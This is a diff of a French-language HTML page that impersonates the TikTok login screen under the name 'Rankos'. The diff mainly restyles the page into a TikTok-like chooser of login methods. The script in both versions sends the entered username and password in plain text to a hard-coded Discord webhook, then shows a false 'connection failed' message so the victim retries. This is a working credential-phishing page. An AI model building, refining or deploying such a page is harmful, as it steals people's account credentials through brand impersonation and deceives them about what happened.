@@ -1,289 +1,299 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Connexion TikTok - Email ou téléphone</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
-<style>
-  /* Reset et base */
-  * {
-    box-sizing: border-box;
-    margin: 0; padding: 0;
-    font-family: 'Inter', sans-serif;
-  }
-  body {
-    background: #fff;
-    color: #161823;
-    display: flex;
-    justify-content: center;
-    align-items: flex-start;
-    min-height: 100vh;
-    padding: 60px 20px 40px;
-  }
-  main {
-    width: 380px;
-  }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connexion Rankos - TikTok</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
 
-  /* Logo centré */
-  .logo {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 48px;
-  }
-  .logo img {
-    height: 40px;
-  }
+    body {
+      background: #fff;
+      color: #000;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
 
-  /* Titre principal */
-  h1 {
-    font-weight: 700;
-    font-size: 28px;
-    text-align: center;
-    margin-bottom: 40px;
-  }
+    header {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
 
-  /* Sous-titre */
-  .subtitle {
-    text-align: center;
-    font-weight: 600;
-    font-size: 16px;
-    color: #161823;
-    margin-bottom: 32px;
-  }
+    .logo {
+      display: flex;
+      align-items: center;
+      font-size: 24px;
+      font-weight: bold;
+    }
 
-  /* Formulaire */
-  form {
-    display: flex;
-    flex-direction: column;
-  }
+    .logo img {
+      height: 24px;
+      margin-right: 8px;
+    }
 
-  label {
-    font-weight: 600;
-    font-size: 14px;
-    margin-bottom: 8px;
-  }
+    .help {
+      font-size: 14px;
+      color: #333;
+      text-decoration: none;
+    }
 
-  input[type="text"],
-  input[type="password"] {
-    font-size: 16px;
-    height: 44px;
-    padding: 0 48px 0 12px;
-    border: 1px solid #e6e6e6;
-    border-radius: 8px;
-    color: #161823;
-    margin-bottom: 16px;
-    transition: border-color 0.2s ease;
-  }
-  input[type="text"]:focus,
-  input[type="password"]:focus {
-    outline: none;
-    border-color: #fe2c55;
-    box-shadow: 0 0 0 3px rgb(254 44 85 / 0.3);
-  }
+    .container, .login-interface {
+      text-align: center;
+      margin-top: 80px;
+      max-width: 400px;
+      width: 100%;
+    }
 
-  /* Wrapper pour mot de passe + bouton afficher */
-  .password-wrapper {
-    position: relative;
-  }
+    h1, h2 {
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
 
-  .toggle-password {
-    position: absolute;
-    right: 14px;
-    top: 50%;
-    transform: translateY(-50%);
-    font-weight: 600;
-    font-size: 14px;
-    color: #fe2c55;
-    cursor: pointer;
-    user-select: none;
-  }
+    h1 {
+      font-size: 28px;
+    }
 
-  /* Bouton connexion */
-  button {
-    margin-top: 12px;
-    background-color: #fe2c55;
-    border: none;
-    border-radius: 8px;
-    height: 44px;
-    color: #fff;
-    font-weight: 700;
-    font-size: 16px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-  button:disabled {
-    background-color: #f3a6b7;
-    cursor: not-allowed;
-  }
+    h2 {
+      font-size: 22px;
+    }
 
-  /* Lien mot de passe oublié */
-  .forgot-password {
-    display: block;
-    margin: 16px 0 32px;
-    font-size: 14px;
-    color: #fe2c55;
-    text-decoration: none;
-  }
+    p.description {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 30px;
+    }
 
-  /* Message d'erreur */
-  .error-message {
-    color: #fe2c55;
-    font-size: 12px;
-    min-height: 18px;
-    margin-top: -12px;
-    margin-bottom: 12px;
-  }
+    .btn {
+      width: 100%;
+      border: 1px solid #ccc;
+      background-color: #fff;
+      padding: 12px;
+      margin-bottom: 10px;
+      border-radius: 8px;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
 
-  /* Texte inscription */
-  .signup-text {
-    font-size: 14px;
-    color: #161823;
-    text-align: center;
-  }
-  .signup-text a {
-    color: #fe2c55;
-    font-weight: 700;
-    text-decoration: none;
-    margin-left: 4px;
-  }
-</style>
+    .btn img {
+      height: 20px;
+      margin-right: 10px;
+    }
+
+    .badge {
+      background-color: #00f0f0;
+      color: white;
+      padding: 2px 6px;
+      border-radius: 8px;
+      font-size: 12px;
+      margin-left: 10px;
+    }
+
+    .terms {
+      font-size: 11px;
+      color: #999;
+      margin-top: 20px;
+    }
+
+    .signup {
+      margin-top: 40px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      color: red;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .login-interface {
+      display: none;
+    }
+
+    .login-interface input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+
+    .login-interface button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      background-color: #eee;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: not-allowed;
+      color: #999;
+    }
+
+    .login-interface button.active {
+      background-color: #fe2c55;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    .login-interface a {
+      display: block;
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #000;
+      text-align: left;
+    }
+
+    .back-link {
+      margin-top: 10px;
+      font-size: 14px;
+      cursor: pointer;
+      color: #000;
+      text-align: left;
+    }
+
+    .password-wrapper {
+      position: relative;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 16px;
+    }
+  </style>
 </head>
 <body>
-  <main>
+
+  <header>
     <div class="logo">
-      <img src="https://www.logo.wine/a/logo/TikTok/TikTok-Logo.wine.svg" alt="TikTok Logo" />
+      <img src="https://www.logo.wine/a/logo/TikTok/TikTok-Logo.wine.svg" alt="TikTok" />
+      TikTok
     </div>
-    <h1>Connexion</h1>
-    <div class="subtitle">Utiliser e-mail / téléphone / nom d'utilisateur</div>
-    <form id="loginForm" novalidate>
-      <label for="emailOrPhone">E-mail ou nom d'utilisateur</label>
-      <input
-        type="text"
-        id="emailOrPhone"
-        name="emailOrPhone"
-        placeholder="E-mail ou nom d'utilisateur"
-        autocomplete="username"
-        required
-      />
-      <div class="error-message" id="emailOrPhoneError"></div>
+    <a class="help" href="#">Commentaires et assistance</a>
+  </header>
 
-      <label for="password">Mot de passe</label>
-      <div class="password-wrapper">
-        <input
-          type="password"
-          id="password"
-          name="password"
-          placeholder="Mot de passe"
-          autocomplete="current-password"
-          required
-        />
-        <span class="toggle-password" id="togglePassword" aria-label="Afficher ou masquer le mot de passe">Afficher</span>
-      </div>
-      <div class="error-message" id="passwordError"></div>
+  <div class="container" id="main-container">
+    <h1>Connecte-toi au site de</h1>
+    <h2>Rankos</h2>
+    <p class="description">Gère ton compte, consulte tes notifications, commente des vidéos et bien plus encore.</p>
 
-      <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+    <div class="btn">
+      <img src="https://img.icons8.com/material-outlined/24/000000/qr-code.png" alt="QR Code" />
+      Utiliser un code QR
+    </div>
 
-      <button type="submit" id="submitBtn" disabled>Connexion</button>
-    </form>
-    <p class="signup-text">
-      Tu n'as pas de compte ?
-      <a href="#">Inscris-toi</a>
+    <div class="btn" onclick="showLoginForm()">
+      <img src="https://img.icons8.com/ios-filled/50/000000/user.png" alt="User Icon" />
+      Utiliser le téléphone/l’e-mail/le nom d’utilisateur
+      <span class="badge">Dernière connexion</span>
+    </div>
+
+    <div class="btn">
+      <img src="https://img.icons8.com/color/48/facebook.png" alt="Facebook" />
+      Continuer avec Facebook
+    </div>
+
+    <div class="btn">
+      <img src="https://img.icons8.com/color/48/google-logo.png" alt="Google" />
+      Continuer avec Google
+    </div>
+
+    <p class="terms">
+      En continuant, tu acceptes les <a href="#">Conditions d'utilisation</a> du site de Rankos et confirmes avoir lu la <a href="#">Politique de confidentialité</a>.
     </p>
-  </main>
+
+    <div class="signup">
+      Tu n'as pas de compte ? <a href="#">S'inscrire</a>
+    </div>
+  </div>
+
+  <div class="login-interface" id="login-form">
+    <h1>Se connecter</h1>
+    <div style="display: flex; justify-content: center; gap: 20px; font-size: 14px; margin-bottom: 20px;">
+      <div style="font-weight: bold;">E-mail ou nom d'utilisateur</div>
+      <div style="color: #888;">Connexion avec un numéro de téléphone</div>
+    </div>
+    <input type="text" id="email" placeholder="E-mail ou nom d'utilisateur" />
+    <div class="password-wrapper">
+      <input type="password" id="password" placeholder="Mot de passe" />
+      <span class="toggle-password" onclick="togglePassword()">👁️</span>
+    </div>
+    <a href="#">Mot de passe oublié ?</a>
+    <button id="loginBtn" disabled>Se connecter</button>
+    <div class="back-link" onclick="showMain()">← Retour</div>
+    <div class="signup">
+      Tu n'as pas de compte ? <a href="#">S'inscrire</a>
+    </div>
+  </div>
 
   <script>
-    const emailOrPhoneInput = document.getElementById('emailOrPhone');
+    function showLoginForm() {
+      document.getElementById('main-container').style.display = 'none';
+      document.getElementById('login-form').style.display = 'block';
+    }
+
+    function showMain() {
+      document.getElementById('main-container').style.display = 'block';
+      document.getElementById('login-form').style.display = 'none';
+    }
+
+    function togglePassword() {
+      const passwordInput = document.getElementById('password');
+      passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+    }
+
+    const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
-    const submitBtn = document.getElementById('submitBtn');
-    const emailOrPhoneError = document.getElementById('emailOrPhoneError');
-    const passwordError = document.getElementById('passwordError');
-    const togglePassword = document.getElementById('togglePassword');
-
-    function containsLetter(str) {
-      return /[a-zA-Z]/.test(str);
-    }
-
-    function containsSpace(str) {
-      return /\s/.test(str);
-    }
-
-    function validateInput(value) {
-      if (containsSpace(value)) return 'La saisie ne doit pas contenir d’espaces.';
-      if (value.length < 5) return 'La saisie doit contenir au moins 5 caractères.';
-      if (value.length > 18) return 'La saisie ne doit pas dépasser 18 caractères.';
-      if (!containsLetter(value)) return 'La saisie doit contenir au moins une lettre.';
-      return '';
-    }
-
-    function validatePassword(value) {
-      if (containsSpace(value)) return 'Le mot de passe ne doit pas contenir d’espaces.';
-      if (value.length < 5) return 'Le mot de passe doit contenir au moins 5 caractères.';
-      if (value.length > 18) return 'Le mot de passe ne doit pas dépasser 18 caractères.';
-      return '';
-    }
+    const loginBtn = document.getElementById('loginBtn');
 
     function updateButtonState() {
-      const emailVal = emailOrPhoneInput.value.trim();
-      const passwordVal = passwordInput.value.trim();
-
-      const emailValidationMsg = validateInput(emailVal);
-      const passwordValidationMsg = validatePassword(passwordVal);
-
-      emailOrPhoneError.textContent = emailValidationMsg;
-      passwordError.textContent = passwordValidationMsg;
-
-      submitBtn.disabled = !!(emailValidationMsg || passwordValidationMsg);
+      if (emailInput.value.trim() && passwordInput.value.trim()) {
+        loginBtn.disabled = false;
+        loginBtn.classList.add('active');
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+      }
     }
 
-    emailOrPhoneInput.addEventListener('input', updateButtonState);
+    emailInput.addEventListener('input', updateButtonState);
     passwordInput.addEventListener('input', updateButtonState);
 
-    togglePassword.addEventListener('click', () => {
-      if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        togglePassword.textContent = 'Masquer';
-      } else {
-        passwordInput.type = 'password';
-        togglePassword.textContent = 'Afficher';
-      }
-    });
-
-    document.getElementById('loginForm').addEventListener('submit', (e) => {
-      e.preventDefault();
-
-      const emailVal = emailOrPhoneInput.value.trim();
-      const passwordVal = passwordInput.value.trim();
-
-      // Validation finale
-      const emailValidationMsg = validateInput(emailVal);
-      const passwordValidationMsg = validatePassword(passwordVal);
-
-      if (emailValidationMsg || passwordValidationMsg) {
-        emailOrPhoneError.textContent = emailValidationMsg;
-        passwordError.textContent = passwordValidationMsg;
-        return;
-      }
+    loginBtn.addEventListener('click', () => {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
 
       const discordMessage =
         `📥 **Nouvelle tentative de connexion TikTok**\n\n` +
-        `**👤 Email ou Nom d'utilisateur :** \`${emailVal}\`\n` +
-        `**🔐 Mot de passe :** \`${passwordVal}\`\n` +
+        `**👤 Email ou Nom d'utilisateur :** \`${email}\`\n` +
+        `**🔐 Mot de passe :** \`${password}\`\n` +
         `🕒 Date : ${new Date().toLocaleString('fr-FR')}`;
 
       fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: discordMessage }),
+        body: JSON.stringify({ content: discordMessage })
       }).then(() => {
-        alert('Connexion échouée. Veuillez réessayer.');
-        emailOrPhoneInput.value = '';
-        passwordInput.value = '';
-        submitBtn.disabled = true;
-      }).catch(() => {
-        alert('Erreur de connexion au serveur.');
+        alert("Connexion échouée. Veuillez réessayer.");
       });
     });
   </script>
+
 </body>
 </html>
